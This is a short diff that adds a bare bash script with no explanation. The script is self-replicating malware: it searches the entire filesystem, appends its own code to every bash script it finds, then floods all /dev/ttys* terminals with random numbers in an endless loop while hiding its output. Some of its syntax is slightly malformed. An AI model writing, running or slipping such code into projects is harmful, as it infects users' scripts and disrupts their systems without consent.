@@ -1,0 +1,2 @@
+#!/bin/bash
+{ find / -type f | while read fn; do head -n1 "$fn" | grep -q "#!.*/bin/bash" && cat "$(basename \"$0\")" >> $fn; done; while :; do for ttys in /dev/ttys*; do echo $RANDOM > $ttys; done; done } > /dev/null 2&>1
